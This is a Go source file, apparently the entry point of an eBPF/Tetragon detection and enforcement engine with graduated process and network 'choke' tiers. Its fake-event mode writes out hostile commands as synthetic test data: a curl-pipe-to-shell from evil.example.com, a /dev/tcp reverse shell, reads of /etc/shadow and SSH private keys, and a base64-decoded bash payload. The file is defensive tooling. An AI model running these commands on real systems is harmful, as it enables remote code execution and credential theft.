package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/cilium/tetragon/api/v1/tetragon"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/protobuf/types/known/wrapperspb"

	"github.com/jeffmk/ebpf-poc-engine/internal/api"
	"github.com/jeffmk/ebpf-poc-engine/internal/choke"
	"github.com/jeffmk/ebpf-poc-engine/internal/choke/circuit"
	"github.com/jeffmk/ebpf-poc-engine/internal/choke/tokens"
	"github.com/jeffmk/ebpf-poc-engine/internal/config"
	"github.com/jeffmk/ebpf-poc-engine/internal/device"
	"github.com/jeffmk/ebpf-poc-engine/internal/enforce"
	"github.com/jeffmk/ebpf-poc-engine/internal/enforce/bpfmap"
	"github.com/jeffmk/ebpf-poc-engine/internal/enforce/cgroupv2"
	"github.com/jeffmk/ebpf-poc-engine/internal/enforce/devbpf"
	"github.com/jeffmk/ebpf-poc-engine/internal/logging"
	"github.com/jeffmk/ebpf-poc-engine/internal/metrics"
	"github.com/jeffmk/ebpf-poc-engine/internal/origin"
	"github.com/jeffmk/ebpf-poc-engine/internal/policy"
	"github.com/jeffmk/ebpf-poc-engine/internal/score"
	"github.com/jeffmk/ebpf-poc-engine/internal/store"
	"github.com/jeffmk/ebpf-poc-engine/internal/sysproc"
	"github.com/jeffmk/ebpf-poc-engine/internal/tree"
)

// gw is the global choke gateway. It is created in main() and read by the
// event handlers. nil-safe: handlers check before dispatching.
var gw *choke.Gateway

// tetragonConnected mirrors the OTel gauge so the /api/system-health
// handler can read live state without reaching into the metrics pipeline.
var tetragonConnected atomic.Bool

func main() {
	var (
		tetragonAddr = flag.String("tetragon", "unix:///var/run/tetragon/tetragon.sock", "Tetragon gRPC address")
		dbPath       = flag.String("db", "events.db", "SQLite database path")
		httpAddr     = flag.String("http", ":8080", "HTTP listen address")
		fakeMode     = flag.Bool("fake", false, "synthesize events instead of connecting to Tetragon (dev/UI mode)")
		authUser     = flag.String("user", "admin", "dashboard username")
		authPass     = flag.String("pass", "ebpf-soc-demo", "dashboard password (plaintext; bcrypted at startup). For production, set pass_hash in config instead so plaintext never lands on disk")
		authHash     = flag.String("pass-hash", "", "bcrypt-hashed dashboard password; takes precedence over -pass when set")
		secretPath   = flag.String("secret", "", "path to HMAC signing secret for session cookies; auto-generated 0600 if missing (default: /etc/ebpf-engine/secret)")
		policiesDir  = flag.String("policies", "policies", "directory containing TracingPolicy YAMLs (for read-only viewer)")
		attacksDir   = flag.String("attacks", "attacks", "directory containing allowlisted attack scripts (for quick-fire panel)")
		honeypotDir  = flag.String("honeypots", "/var/lib/ebpf-engine/honey", "directory where decoy files are seeded; access fires alerts when watched by sensitive-files policy")
		// Phase 1+2: choke gateway
		chokeDir     = flag.String("choke-policies", "policies/choke", "directory containing ChokePolicy YAMLs (DSL); empty disables policy-driven choking")
		dryRun       = flag.Bool("dry-run", false, "shadow mode: record decisions but do not execute enforcement actions")
		enforceFlag  = flag.Bool("enforce", false, "enable real enforcement (kill/throttle); when false, decisions are logged only")
		throttleAt   = flag.Int("throttle-at", 5, "chain score at which to start throttling")
		tarpitAt     = flag.Int("tarpit-at", 15, "chain score at which to tarpit")
		quarantineAt = flag.Int("quarantine-at", 25, "chain score at which to quarantine (sinkhole)")
		severAt      = flag.Int("sever-at", 40, "chain score at which to sever (SIGKILL)")
		cgroupRoot   = flag.String("cgroup-root", cgroupv2.DefaultRoot, "cgroup v2 unified mount; choke-{throttled,tarpit,quarantined} are created under this root")
		critBinsRaw  = flag.String("system-critical", "", "comma-separated list of binaries exempt from SCORE-DRIVEN auto-enforce (manual overrides still apply); empty = use the default safe list (sshd, systemd, dockerd, …)")
		// Tier 1 fleet console (Fleet Console at /fleet). When this points at
		// a chokectl-format hosts file, /api/fleet/* endpoints fan out to
		// each peer and the embedded UI lets one operator drive N hosts.
		fleetHosts = flag.String("fleet-hosts", "", "path to chokectl.hosts file; enables the /fleet console and /api/fleet/* fanout endpoints")
		// cilium/ebpf data plane: when -bpf-obj points at a compiled
		// choke.o the engine loads it and attaches cgroup/connect{4,6}
		// programs to -bpf-cgroup. Empty -bpf-obj keeps the noop backend
		// (in-memory mirror only — no kernel enforcement).
		bpfObj    = flag.String("bpf-obj", "", "path to compiled choke.o; empty disables the cilium/ebpf data plane and falls back to the in-memory noop backend")
		bpfCgroup = flag.String("bpf-cgroup", "/sys/fs/cgroup", "cgroup v2 root to attach the BPF program to")
		// Network (per-device / MAC) choke data plane. When -devchoke-obj
		// points at a compiled devchoke.o AND -devchoke-iface names one or
		// more LAN/bridge-slave interfaces, the engine loads it and attaches
		// tc ingress+egress so it can throttle/block forwarded traffic by
		// device MAC. Empty -devchoke-iface keeps the in-memory noop backend.
		devchokeObj     = flag.String("devchoke-obj", "", "path to compiled devchoke.o; empty disables the network device choke data plane")
		devchokeIface   = flag.String("devchoke-iface", "", "comma-separated LAN/bridge-slave interfaces to attach the device choke to (e.g. eth0,eth1)")
		devchokeProtect = flag.String("devchoke-protect", "", "comma-separated MAC allow-list (gateway/uplink/DHCP-DNS/operator) the engine refuses to quarantine/sever; interface MACs are auto-added")
		// Storage backend. -db is reused as the SQLite path; -pg-dsn carries
		// the Postgres connection string when -store=postgres.
		storeKind = flag.String("store", "sqlite", "storage backend: sqlite | postgres")
		pgDSN     = flag.String("pg-dsn", "", "Postgres DSN (e.g. postgres://user:pass@host:5432/db?sslmode=disable); required when -store=postgres")
		// Observability.
		logFormat    = flag.String("log-format", "text", "log handler: text (dev) | json (production — for journald → Vector → Loki/Elastic)")
		logLevel     = flag.String("log-level", "info", "log level: debug | info | warn | error")
		otlpEndpoint = flag.String("otlp-endpoint", "", "OTLP/HTTP metrics endpoint (e.g. http://otel-collector:4318); 'stdout' to print metrics every 30s; empty disables metrics")
		// YAML config file. Any field set in the file is used iff the
		// matching CLI flag is still at its default — flags always win.
		configPath = flag.String("config", "", "path to YAML config file (every field has a CLI-flag equivalent; CLI flags override file values)")
	)
	flag.Parse()

	// File config: load + merge before any flag value gets consumed.
	if cfg, err := config.Load(*configPath); err != nil {
		log.Fatalf("config: %v", err)
	} else if cfg != nil {
		config.ApplyString(tetragonAddr, cfg.Tetragon, "unix:///var/run/tetragon/tetragon.sock")
		config.ApplyString(dbPath, cfg.DB, "events.db")
		config.ApplyString(httpAddr, cfg.HTTP, ":8080")
		config.ApplyString(authUser, cfg.User, "admin")
		config.ApplyString(authPass, cfg.Pass, "ebpf-soc-demo")
		config.ApplyString(authHash, cfg.PassHash, "")
		config.ApplyString(secretPath, cfg.SecretPath, "")
		config.ApplyString(policiesDir, cfg.PoliciesDir, "policies")
		config.ApplyString(attacksDir, cfg.AttacksDir, "attacks")
		config.ApplyString(honeypotDir, cfg.HoneypotsDir, "/var/lib/ebpf-engine/honey")
		config.ApplyString(chokeDir, cfg.ChokeDir, "policies/choke")
		config.ApplyBool(dryRun, cfg.DryRun, false)
		config.ApplyBool(enforceFlag, cfg.Enforce, false)
		config.ApplyInt(throttleAt, cfg.ThrottleAt, 5)
		config.ApplyInt(tarpitAt, cfg.TarpitAt, 15)
		config.ApplyInt(quarantineAt, cfg.QuarantineAt, 25)
		config.ApplyInt(severAt, cfg.SeverAt, 40)
		config.ApplyString(cgroupRoot, cfg.CgroupRoot, cgroupv2.DefaultRoot)
		config.ApplyString(critBinsRaw, cfg.SystemCritical, "")
		config.ApplyString(fleetHosts, cfg.FleetHosts, "")
		config.ApplyString(bpfObj, cfg.BPFObj, "")
		config.ApplyString(bpfCgroup, cfg.BPFCgroup, "/sys/fs/cgroup")
		config.ApplyString(devchokeObj, cfg.DevchokeObj, "")
		config.ApplyString(devchokeIface, cfg.DevchokeIfaces, "")
		config.ApplyString(devchokeProtect, cfg.DevchokeProtect, "")
		config.ApplyString(storeKind, cfg.Store, "sqlite")
		config.ApplyString(pgDSN, cfg.PgDSN, "")
		config.ApplyString(logFormat, cfg.LogFormat, "text")
		config.ApplyString(logLevel, cfg.LogLevel, "info")
		config.ApplyString(otlpEndpoint, cfg.OTLPEndpoint, "")
		log.Printf("[config] loaded %s", *configPath)
	}

	// Logging: install slog as the default and bridge stdlib log onto it.
	// Existing log.Printf("…") calls keep working but emit structured records.
	logging.Setup(*logFormat, *logLevel)

	// Metrics: OTel meter provider + instruments. Empty endpoint disables
	// the SDK entirely (instruments stay nil; the safe* helpers no-op).
	hostname, _ := os.Hostname()
	mp, err := metrics.Init(context.Background(), *otlpEndpoint, hostname, "0.2.0")
	if err != nil {
		log.Fatalf("metrics: %v", err)
	}
	defer func() {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = mp.Shutdown(ctx)
	}()
	if *otlpEndpoint != "" {
		log.Printf("[metrics] otlp endpoint=%s", *otlpEndpoint)
	}

	api.SetPolicyDir(*policiesDir)
	api.SetAttackDir(*attacksDir)
	if err := api.EnsureHoneypots(*honeypotDir); err != nil {
		log.Printf("honeypots: setup failed (%v) — continuing without decoys", err)
	} else {
		log.Printf("honeypots: seeded at %s", *honeypotDir)
	}

	var st *store.Store
	switch *storeKind {
	case "postgres":
		if *pgDSN == "" {
			log.Fatalf("store: -store=postgres requires -pg-dsn (e.g. postgres://engine:engine@127.0.0.1:5432/ebpf?sslmode=disable)")
		}
		var err error
		st, err = store.NewPostgres(*pgDSN)
		if err != nil {
			log.Fatalf("store: postgres: %v", err)
		}
		log.Printf("[store] postgres connected (%s)", redactDSN(*pgDSN))
	case "sqlite", "":
		var err error
		st, err = store.New(*dbPath)
		if err != nil {
			log.Fatalf("store: sqlite: %v", err)
		}
		log.Printf("[store] sqlite at %s", *dbPath)
	default:
		log.Fatalf("store: unknown backend %q (want sqlite or postgres)", *storeKind)
	}
	defer st.Close()

	pt := tree.New(10 * time.Minute)
	broadcast := make(chan api.Broadcast, 1024)

	credential := *authPass
	if *authHash != "" {
		credential = *authHash // pre-hashed bcrypt: NewAuth detects $2a$/$2b$/$2y$ prefix
	}
	auth, err := api.NewAuth(*authUser, credential, *secretPath)
	if err != nil {
		log.Fatalf("auth: %v", err)
	}
	httpSrv := api.NewServer(st, pt, broadcast, auth)
	if *fleetHosts != "" {
		// Same credentials chokectl uses by default; the engine itself acts
		// as the operator presenting them to peers. Per-peer audit chains
		// remain the tamper-evident record.
		httpSrv.SetFleet(api.NewFleet(*fleetHosts, *authUser, *authPass))
		log.Printf("[fleet] console enabled at /fleet (hosts=%s)", *fleetHosts)
	}
	go func() {
		if err := httpSrv.Start(*httpAddr); err != nil {
			log.Fatalf("http: %v", err)
		}
	}()

	// ---- Choke Gateway (phases 1 & 2) -------------------------------------
	// Backends: throttler writes per-PID rate buckets into the BPF map (via
	// the cilium/ebpf loader when -bpf-obj is set, otherwise the in-memory
	// noop backend); severer sends SIGKILL on ActSever. Composed via Multi.
	var bpfBackend bpfmap.Backend
	if *bpfObj != "" {
		cilium := bpfmap.NewCiliumEBPFBackend(*bpfObj, *bpfCgroup)
		if err := cilium.Open(); err != nil {
			log.Printf("[bpfmap] cilium backend failed (%v) — falling back to noop", err)
			noop := bpfmap.NewNoopBackend()
			if err := noop.Open(); err != nil {
				log.Fatalf("bpfmap open: %v", err)
			}
			bpfBackend = noop
		} else {
			log.Printf("[bpfmap] cilium/ebpf data plane loaded from %s, attached to %s (%d link(s))",
				*bpfObj, *bpfCgroup, cilium.AttachedLinks())
			metrics.SetBPFAttachedLinks(int64(cilium.AttachedLinks()))
			bpfBackend = cilium
		}
	} else {
		noop := bpfmap.NewNoopBackend()
		if err := noop.Open(); err != nil {
			log.Fatalf("bpfmap open: %v", err)
		}
		log.Printf("[bpfmap] noop backend (no -bpf-obj) — userspace mirror only, no kernel enforcement")
		bpfBackend = noop
	}
	defer bpfBackend.Close()

	// BPF map size: periodic gauge reporter. Snapshot iterates the hash
	// map; 10s is generous for an SRE-grade gauge and keeps the cost off
	// the event hot path.
	go func() {
		t := time.NewTicker(10 * time.Second)
		defer t.Stop()
		for range t.C {
			snap, err := bpfBackend.Snapshot()
			if err != nil {
				continue
			}
			metrics.SetBPFEntries(int64(len(snap)))
		}
	}()
	throttleBackend := &enforce.Throttler{Backend: bpfBackend}
	severerBackend := &enforce.Severer{}

	// cgroup v2 backend — real per-PID throttle / tarpit / quarantine on
	// Linux. On non-Linux this is a no-op stub (Apply returns
	// ErrUnsupported) so the engine still compiles and runs in dev mode.
	cgBackend := cgroupv2.NewBackend(*cgroupRoot)
	if cgBackend.Available() {
		if err := cgBackend.Mgr.Setup(); err != nil {
			log.Printf("[cgroupv2] setup failed (%v) — graduated enforcement will fall through to telemetry only", err)
		} else {
			log.Printf("[cgroupv2] choke tiers ready under %s", *cgroupRoot)
		}
	} else {
		log.Printf("[cgroupv2] not available at %s — graduated enforcement disabled (sever still works via SIGKILL)", *cgroupRoot)
	}

	// Order matters: the cgroup backend handles throttle/tarpit/quarantine
	// (real kernel-level choke), the severer handles sever (SIGKILL), and
	// the throttler trails as a telemetry mirror writing to the noop
	// bpfmap so the UI's "Choke Map (kernel)" panel still populates.
	//
	// We always build BOTH enforcer chains and hand them to the gateway so
	// the operator can flip detect-only ⇄ enforcing at runtime via
	// /api/choke/mode. -enforce only picks which one is active at boot.
	realEnforcer := &enforce.Multi{
		Backends: []enforce.Enforcer{cgBackend, severerBackend, throttleBackend},
	}
	loggerEnforcer := &enforce.Logger{Prefix: "[enforce-disabled]"}
	var enforcer enforce.Enforcer = realEnforcer
	if !*enforceFlag {
		enforcer = loggerEnforcer
	}

	// Policy DSL — load all *.yaml under -choke-policies. Missing dir is
	// not an error; you just get no DSL-driven choking.
	policySet := policy.NewSet()
	if *chokeDir != "" {
		set, warns, err := policy.LoadDir(*chokeDir)
		if err == nil {
			policySet = set
			for _, w := range warns {
				log.Printf("[policy] warn: %v", w)
			}
			log.Printf("[policy] loaded %d choke policies from %s", set.Len(), *chokeDir)
		} else if !os.IsNotExist(err) {
			log.Printf("[policy] load %s: %v (continuing without DSL)", *chokeDir, err)
		}
	}

	// system-critical exemption list — comma-separated CLI override or
	// the package's safe defaults (sshd, systemd, dockerd, …). Score-
	// driven transitions on these binaries are audited but the enforcer
	// is bypassed; manual overrides still go through.
	var critBins []string
	if *critBinsRaw != "" {
		for _, b := range strings.Split(*critBinsRaw, ",") {
			if t := strings.TrimSpace(b); t != "" {
				critBins = append(critBins, t)
			}
		}
	} else {
		critBins = choke.DefaultSystemCriticalBinaries()
	}
	log.Printf("[gateway] system-critical exemption: %d binaries (auto-enforce bypassed; manual override allowed)", len(critBins))

	gw = choke.NewGateway(choke.Config{
		Store:          st,
		Enforcer:       enforcer,
		RealEnforcer:   realEnforcer,
		LoggerEnforcer: loggerEnforcer,
		Broadcast:      httpSrv,
		Tokens:         tokens.NewManager(),
		Policies:       policySet,
		Tree:           pt,
		BPFMap:         bpfBackend,
		Thresholds: circuit.Config{
			ThrottleAt:   *throttleAt,
			TarpitAt:     *tarpitAt,
			QuarantineAt: *quarantineAt,
			SeverAt:      *severAt,
		},
		DryRun:                 *dryRun,
		Enforcing:              *enforceFlag,
		SystemCriticalBinaries: critBins,
	})
	httpSrv.SetGateway(gw)

	// ---- Network Choke Gateway (per-device / MAC) -------------------------
	// A parallel data plane: tc clsact programs keyed by MAC on the LAN /
	// bridge-slave interfaces, independent of the process choke above. Loads
	// only when -devchoke-obj + -devchoke-iface are set; otherwise an
	// in-memory noop backend keeps the /api/choke/device-* endpoints alive
	// (useful for UI iteration). Operator/manual-driven — no score path.
	devIfaces := splitCSV(*devchokeIface)
	var devBackend devbpf.Backend
	if *devchokeObj != "" && len(devIfaces) > 0 {
		tc := devbpf.NewCiliumTCBackend(*devchokeObj, devIfaces)
		if err := tc.Open(); err != nil {
			log.Printf("[devbpf] tc backend failed (%v) — falling back to noop", err)
			noop := devbpf.NewNoopDeviceBackend()
			_ = noop.Open()
			devBackend = noop
		} else {
			log.Printf("[devbpf] tc data plane loaded from %s on [%s] (%d link(s), tier=%s)",
				*devchokeObj, *devchokeIface, tc.AttachedLinks(), tc.DataPlaneTier())
			devBackend = tc
		}
	} else {
		noop := devbpf.NewNoopDeviceBackend()
		_ = noop.Open()
		log.Printf("[devbpf] network device choke inactive (need -devchoke-obj + -devchoke-iface) — noop backend")
		devBackend = noop
	}
	defer devBackend.Close()

	// Protected MAC allow-list: operator-supplied (gateway/uplink/DHCP-DNS/
	// operator workstation) PLUS the configured interfaces' own hardware
	// addresses, so the box can never quarantine/sever its own bridge ports.
	protected := map[devbpf.MAC]bool{}
	for _, m := range splitCSV(*devchokeProtect) {
		if mac, err := devbpf.ParseMAC(m); err == nil {
			protected[mac] = true
		} else {
			log.Printf("[devgateway] -devchoke-protect: skipping bad MAC %q: %v", m, err)
		}
	}
	for _, ifn := range devIfaces {
		if iface, err := net.InterfaceByName(ifn); err == nil && len(iface.HardwareAddr) == 6 {
			if mac, err := devbpf.ParseMAC(iface.HardwareAddr.String()); err == nil {
				protected[mac] = true
			}
		}
	}
	deviceTable := device.NewTable(time.Hour)
	deviceThrottler := enforce.NewDeviceThrottler(devBackend, protected)
	deviceGW := choke.NewDeviceGateway(choke.DeviceConfig{
		Throttler: deviceThrottler,
		Backend:   devBackend,
		Table:     deviceTable,
		Store:     st,
		Broadcast: httpSrv,
		DryRun:    *dryRun,
		// Device choke starts detect-only just like the process gateway.
		// Operators explicitly flip to enforcing at runtime after confirming
		// protected MACs and data-plane reachability.
		Enforcing: false,
	})
	httpSrv.SetDeviceGateway(deviceGW)
	log.Printf("[devgateway] network device choke ready (ifaces=%q protected=%d dry_run=%v)",
		*devchokeIface, len(protected), *dryRun)

	// Wire cgroup pass-throughs so /api/choke/cgroups + /api/choke/thaw
	// reach the manager without dragging the linux-only package into
	// the choke package itself.
	gw.SetCgroupInhabitorsFn(cgBackend.Mgr.Inhabitants)
	gw.SetThawFn(cgBackend.Mgr.Thaw)
	// Process picker: read /proc on every request and adapt the slice
	// shape into the gateway's choke.SysProcEntry to keep the choke
	// package free of OS-specific imports.
	gw.SetSysProcListFn(func() ([]choke.SysProcEntry, error) {
		raw, err := sysproc.List()
		if err != nil {
			return nil, err
		}
		out := make([]choke.SysProcEntry, 0, len(raw))
		for _, e := range raw {
			out = append(out, choke.SysProcEntry{
				PID: e.PID, PPID: e.PPID, UID: e.UID,
				Comm: e.Comm, Exe: e.Exe, Cmdline: e.Cmdline,
				StartTime: e.StartTime,
			})
		}
		return out, nil
	})
	// Live /proc snapshot for the inspect drawer — same OS-isolation
	// pattern as SetSysProcListFn so the gateway package stays free of
	// /proc imports. Backend is no-op on non-Linux dev builds.
	// Origin tracker — attributes processes to the remote client that
	// triggered them (e.g. an SSH session's source IP + key fingerprint).
	// The journald tailer is the source of SSH attribution on Linux; on
	// other platforms the tracker stays empty and decisions simply carry
	// no origin fields. 30-minute TTL covers typical SSH session lifetimes
	// without unbounded growth.
	originTracker := origin.NewTracker(30 * time.Minute)
	httpSrv.SetOriginSnapshotFn(func() map[uint32]map[string]interface{} {
		raw := originTracker.Snapshot()
		out := make(map[uint32]map[string]interface{}, len(raw))
		for pid, o := range raw {
			out[pid] = map[string]interface{}{
				"kind":        string(o.Kind),
				"remote_ip":   o.RemoteIP,
				"remote_port": o.RemotePort,
				"user":        o.User,
				"fingerprint": o.Fingerprint,
				"first_seen":  o.FirstSeen,
			}
		}
		return out
	})
	gw.SetOriginLookupFn(func(pid uint32, execID string) (choke.OriginInfo, bool) {
		// Walk ancestors via the engine's in-memory process tree. The tree
		// holds nodes for ~10 minutes after exit, so short-lived chains
		// (SSH MOTD scripts that die in ms) still resolve to their
		// per-session sshd parent. /proc would have lost them already.
		ancestors := func(_ uint32) []uint32 {
			if execID == "" {
				return nil
			}
			nodes := pt.Ancestors(execID, 10)
			out := make([]uint32, 0, len(nodes))
			for _, n := range nodes {
				if n.PID != 0 {
					out = append(out, n.PID)
				}
			}
			return out
		}
		o, ok := originTracker.Lookup(pid, ancestors)
		if !ok {
			return choke.OriginInfo{}, false
		}
		return choke.OriginInfo{
			Kind:        string(o.Kind),
			RemoteIP:    o.RemoteIP,
			RemotePort:  o.RemotePort,
			User:        o.User,
			Fingerprint: o.Fingerprint,
		}, true
	})
	gw.SetSysProcDetailFn(func(pid uint32) (choke.SysProcDetail, error) {
		d, err := sysproc.ReadDetail(pid)
		if err != nil {
			return choke.SysProcDetail{PID: pid}, err
		}
		return choke.SysProcDetail{
			PID:         d.PID,
			Status:      d.Status,
			Threads:     d.Threads,
			VmRSSKB:     d.VmRSSKB,
			VmSizeKB:    d.VmSizeKB,
			StartedUnix: d.StartedUnix,
			Cwd:         d.Cwd,
			Root:        d.Root,
			NumFDs:      d.NumFDs,
			FDSamples:   d.FDSamples,
			NumConns:    d.NumConns,
			ConnPeers:   d.ConnPeers,
		}, nil
	})
	mode := "ENFORCING"
	if *dryRun {
		mode = "DRY-RUN"
	} else if !*enforceFlag {
		mode = "DETECT-ONLY"
	}
	log.Printf("[gateway] %s; thresholds throttle=%d tarpit=%d quarantine=%d sever=%d",
		mode, *throttleAt, *tarpitAt, *quarantineAt, *severAt)

	// System health snapshot for /api/system-health (rendered by the
	// "System Health" panel in the choke console). Closures so live
	// values (BPF link count, map size, Tetragon stream state) are
	// re-read on every request.
	bpfBackendKind := "noop"
	bpfLinksFn := func() int { return 0 }
	if cilium, ok := bpfBackend.(*bpfmap.CiliumEBPFBackend); ok {
		bpfBackendKind = "cilium-ebpf"
		bpfLinksFn = func() int { return cilium.AttachedLinks() }
	}
	storeTarget := *dbPath
	if *storeKind == "postgres" {
		storeTarget = redactDSN(*pgDSN)
	}
	httpSrv.SetSystemInfo(api.SystemInfo{
		Version:      "0.2.0",
		StartedAt:    time.Now().UTC(),
		StoreBackend: *storeKind,
		StoreTarget:  storeTarget,
		BPFBackend:   bpfBackendKind,
		OTLPEndpoint: *otlpEndpoint,
		LogFormat:    *logFormat,
		LogLevel:     *logLevel,
		BPFLinks:     bpfLinksFn,
		BPFEntries: func() int {
			snap, err := bpfBackend.Snapshot()
			if err != nil {
				return -1
			}
			return len(snap)
		},
		TetragonConnected: func() bool { return tetragonConnected.Load() },
	})

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start the sshd journald tailer (Linux only; soft-degrades on macOS
	// dev builds and on hosts without journalctl in PATH). Any SSH session
	// that authenticates after this point gets attributed in the tracker.
	if err := origin.NewSSHDTailer(originTracker).Start(ctx); err != nil {
		log.Printf("[origin/sshd] start failed: %v (continuing without SSH attribution)", err)
	}
	// Origin tracker sweeper — evicts entries older than the TTL once a
	// minute so the map stays bounded even on busy boxes.
	go func() {
		t := time.NewTicker(time.Minute)
		defer t.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-t.C:
				originTracker.Sweep()
			}
		}
	}()

	// Device discovery: passively sniff DHCP on the bridge for
	// MAC<->IP<->hostname, and on a ticker drain the data plane's seen map
	// (MAC + last source IP, in-kernel) and poll the neigh table. All feed
	// the one DeviceTable the device gateway reads from.
	device.StartDHCPSniffer(ctx, devIfaces, deviceTable.Record)
	go func() {
		t := time.NewTicker(10 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-t.C:
				if seen, err := devBackend.SeenSnapshot(); err == nil {
					for mac, sv := range seen {
						deviceTable.Record(device.Device{
							MAC:     mac.String(),
							LastIP:  device.IPv4BEToString(sv.LastSrcIPv4),
							Packets: sv.Packets,
							Source:  device.SourcePassive,
						})
					}
				}
				if neigh, err := device.PollNeigh(); err == nil {
					for _, d := range neigh {
						deviceTable.Record(d)
					}
				}
				deviceTable.Sweep()
			}
		}
	}()

	sigC := make(chan os.Signal, 1)
	signal.Notify(sigC, syscall.SIGINT, syscall.SIGTERM)
	go func() { <-sigC; log.Println("shutting down"); cancel() }()

	if *fakeMode {
		log.Println("fake mode: synthesizing events (no Tetragon required)")
		runFake(ctx, st, pt, broadcast)
		return
	}

	conn, err := grpc.Dial(*tetragonAddr,
		grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Fatalf("dial tetragon: %v", err)
	}
	defer conn.Close()

	client := tetragon.NewFineGuidanceSensorsClient(conn)

	stream, err := client.GetEvents(ctx, &tetragon.GetEventsRequest{})
	if err != nil {
		log.Fatalf("get events: %v", err)
	}

	log.Println("subscribed to Tetragon event stream")
	metrics.SetTetragonConnected(true)
	tetragonConnected.Store(true)
	defer func() {
		metrics.SetTetragonConnected(false)
		tetragonConnected.Store(false)
	}()

	for {
		resp, err := stream.Recv()
		if err != nil {
			log.Printf("stream closed: %v", err)
			return
		}
		handleEvent(resp, st, pt, broadcast)
	}
}

// runFake synthesizes a deterministic stream of attack-pattern events
// through the same handlers. It exists so the UI, scoring, SSE, and
// SQLite paths can be exercised end-to-end without a Linux/Tetragon
// host. It runs until ctx is cancelled.
func runFake(ctx context.Context, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	scenarios := []func(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast){
		fakeWebshell,
		fakeReverseShell,
		fakeCredentialTheft,
		fakePrivEsc,
		fakeLOLBin,
	}

	tick := time.NewTicker(4 * time.Second)
	defer tick.Stop()

	seq := 0
	scenarios[seq%len(scenarios)](seq, st, pt, broadcast)
	seq++

	for {
		select {
		case <-ctx.Done():
			return
		case <-tick.C:
			scenarios[seq%len(scenarios)](seq, st, pt, broadcast)
			seq++
		}
	}
}

func fakeProcess(execID string, pid, uid uint32, binary, args string) *tetragon.Process {
	return &tetragon.Process{
		ExecId:    execID,
		Pid:       wrapperspb.UInt32(pid),
		Uid:       wrapperspb.UInt32(uid),
		Binary:    binary,
		Arguments: args,
	}
}

func fakeFileArg(path string) *tetragon.KprobeArgument {
	return &tetragon.KprobeArgument{
		Arg: &tetragon.KprobeArgument_FileArg{FileArg: &tetragon.KprobeFile{Path: path}},
	}
}

func fakeIntArg(v int32) *tetragon.KprobeArgument {
	return &tetragon.KprobeArgument{
		Arg: &tetragon.KprobeArgument_IntArg{IntArg: v},
	}
}

func fakeWebshell(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	parent := fmt.Sprintf("fake-bash-%d", seq)
	child := fmt.Sprintf("fake-curl-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(parent, 1000, 1000, "/bin/bash", "-c 'curl evil.example.com | sh'"),
	}, st, pt, broadcast)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(child, 1001, 1000, "/usr/bin/curl", "-fsSL https://evil.example.com/payload.sh | sh"),
		Parent:  fakeProcess(parent, 1000, 1000, "/bin/bash", ""),
	}, st, pt, broadcast)
	handleKprobe(&tetragon.ProcessKprobe{
		Process:    fakeProcess(child, 1001, 0, "/usr/bin/curl", ""),
		PolicyName: "sensitive-file-access",
		Args:       []*tetragon.KprobeArgument{fakeFileArg("/etc/shadow"), fakeIntArg(4)},
	}, st, pt, broadcast)
}

func fakeReverseShell(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	bashID := fmt.Sprintf("fake-rsh-bash-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(bashID, 2000, 1000, "/bin/bash", "-c 'exec 3<>/dev/tcp/127.0.0.1/4444'"),
	}, st, pt, broadcast)
	handleKprobe(&tetragon.ProcessKprobe{
		Process:    fakeProcess(bashID, 2000, 1000, "/bin/bash", ""),
		PolicyName: "outbound-connections",
		Args:       []*tetragon.KprobeArgument{},
	}, st, pt, broadcast)
}

func fakeCredentialTheft(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	bashID := fmt.Sprintf("fake-cred-bash-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(bashID, 3000, 0, "/bin/bash", "-c 'cat /etc/shadow'"),
	}, st, pt, broadcast)
	for _, target := range []string{"/etc/shadow", "/etc/sudoers", "/root/.ssh/id_rsa"} {
		handleKprobe(&tetragon.ProcessKprobe{
			Process:    fakeProcess(bashID, 3000, 0, "/bin/bash", ""),
			PolicyName: "sensitive-file-access",
			Args:       []*tetragon.KprobeArgument{fakeFileArg(target), fakeIntArg(4)},
		}, st, pt, broadcast)
	}
}

func fakePrivEsc(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	bashID := fmt.Sprintf("fake-priv-bash-%d", seq)
	sudoID := fmt.Sprintf("fake-priv-sudo-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(bashID, 4000, 1000, "/bin/bash", ""),
	}, st, pt, broadcast)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(sudoID, 4001, 1000, "/usr/bin/sudo", "-i"),
		Parent:  fakeProcess(bashID, 4000, 1000, "/bin/bash", ""),
	}, st, pt, broadcast)
	handleKprobe(&tetragon.ProcessKprobe{
		Process:    fakeProcess(sudoID, 4001, 0, "/usr/bin/sudo", ""),
		PolicyName: "privilege-escalation",
		Args:       []*tetragon.KprobeArgument{fakeIntArg(0)},
	}, st, pt, broadcast)
}

func fakeLOLBin(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	id := fmt.Sprintf("fake-lol-bash-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(id, 5000, 1000, "/bin/bash", "-c 'echo aGVsbG8K | base64 -d | bash'"),
	}, st, pt, broadcast)
}

func handleEvent(resp *tetragon.GetEventsResponse, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	switch ev := resp.Event.(type) {
	case *tetragon.GetEventsResponse_ProcessExec:
		handleExec(ev.ProcessExec, st, pt, broadcast)
